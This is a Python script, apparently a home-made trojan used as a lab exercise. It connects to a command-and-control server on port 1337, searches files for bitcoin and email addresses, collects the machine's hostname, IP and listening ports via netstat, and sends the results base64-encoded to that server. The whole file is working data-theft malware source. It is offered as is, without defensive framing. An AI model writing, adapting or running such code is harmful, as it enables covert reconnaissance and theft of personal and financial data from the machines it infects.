#!/usr/bin/python3
import requests
import socket
import base64
import json
import re
import os
import codecs
import pynput
from pynput.keyboard import Key, Listener
import subprocess

def main():
    # create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # connect to command and control server on port 1337
    s.connect(("10.0.2.18", 1337))

    # get hostname of the machine
    hostname = socket.gethostname()

    #get IP of the machine
    try:
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'

    # search for bitcoin and email addresses
    bitcoin_addresses_list = []
    email_addresses_list = []
    for root, subdirs, files in os.walk("/home/matt/Documents/python-trojan/test-data"):
        for file in files:
            file_fd = open("{}/{}".format(root, file), "r")
            #print(root, file)
            try:
                # read the contents of each file
                file_contents = file_fd.read().strip()

                # search for bitcoin addresses
                bitcoin_addresses = re.findall(r"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$", file_contents)
              
                # search for email addresses
                email_addresses = re.findall(r"[a-z0-9._]+@[a-z0-9]+\.[a-z]{1,7}", file_contents)
       
                # check if we have found any bitcoin addresses or emails
                if len(bitcoin_addresses) > 0:
                    bitcoin_addresses_list = bitcoin_addresses_list + bitcoin_addresses
                if len(email_addresses) > 0:
                    email_addresses_list = email_addresses_list + email_addresses

                file_fd.close()
            except:
                pass

    # get all open ports on the machine
    open_ports = os.popen("netstat -plant | grep -i listen | awk '{print $4}' | grep -P '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}'").read()
    open_ports = open_ports.strip().split("\n")


    # encode data to json and send them to command and control server
    data = {
        "machine_hostname": hostname,
        "machine_ip": IP,
        "machine_open_ports": open_ports,
        "bitcoin_addresses_found": bitcoin_addresses_list,
        "email_addresses_found":email_addresses_list
    }

    # base64 encode the json data
    encoded_data = base64.b64encode(json.dumps(data).encode())

    # # # send data to command and control server
    s.send(encoded_data)


    s.close()


if __name__ == "__main__":
    main()